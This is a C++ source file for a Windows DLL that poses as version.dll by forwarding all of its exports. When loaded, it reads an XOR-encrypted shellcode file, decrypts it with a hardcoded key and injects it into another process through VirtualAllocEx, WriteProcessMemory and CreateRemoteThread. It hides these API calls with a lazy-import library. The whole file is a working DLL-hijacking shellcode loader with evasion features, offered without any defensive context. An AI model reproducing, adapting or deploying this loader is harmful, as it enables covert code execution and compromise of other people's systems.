
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include "lazy.hpp"

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:GetFileVersionInfoA=ver.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=ver.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=ver.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=ver.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=ver.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=ver.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=ver.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=ver.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=ver.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=ver.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=ver.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=ver.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=ver.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=ver.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=ver.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=ver.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=ver.VerQueryValueW,@17")


void exclusiveor(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}
char key[] = "kvUDb2PS0s8YZXJ4yd1gxzI5IZ6r3O2j";

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD reason,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:

        FILE* fp;
        size_t shellcodeSize;
        unsigned char* shellcode;
        fp = fopen("StagelessUpdatetcp.bin", "rb");
        fseek(fp, 0, SEEK_END);
        shellcodeSize = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        shellcode = (unsigned char*)malloc(shellcodeSize);
        fread(shellcode, shellcodeSize, 1, fp);
       
        exclusiveor((char*)shellcode, shellcodeSize, key, sizeof(key));

        HANDLE processHandle;
        HANDLE remoteThread;
        PVOID remoteBuffer;

        processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(3420));
        remoteBuffer = LI_FN(VirtualAllocEx)(processHandle, nullptr, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        LI_FN(WriteProcessMemory)(processHandle, remoteBuffer, shellcode, shellcodeSize, nullptr);
        remoteThread = LI_FN(CreateRemoteThread)(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
        CloseHandle(processHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



